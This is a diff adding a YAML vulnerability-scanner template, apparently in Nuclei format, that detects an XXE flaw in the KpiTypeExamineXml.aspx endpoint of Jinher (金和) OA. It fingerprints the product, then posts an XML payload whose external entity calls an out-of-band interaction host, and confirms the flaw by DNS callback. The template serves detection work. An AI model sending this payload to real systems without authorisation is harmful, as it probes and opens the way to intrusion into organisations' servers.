@@ -1,0 +1,48 @@
+id: poc-yaml-jinher-kpitypeexaminexml-aspx-xxe
+info:
+  name: "金和 OA KpiTypeExamineXml.aspx XXE 漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 金和OA
+  description: |
+    This template detects XXE vulnerabilities in 金和OA KpiTypeExamineXml.aspx by leveraging DNS interactions for out-of-band verification.
+
+dns:
+  - type: A
+    name: "{{interactsh-url}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        words:
+          - "JHSoft"
+        part: body
+
+  - raw:
+      - |
+        POST /c6/Jhsoft.Web.Appraise/KpiTypeExamineXml.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "https://{{interactsh-url}}/xxe_test">
+        %remote;]>
+        <root/>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - body == ""
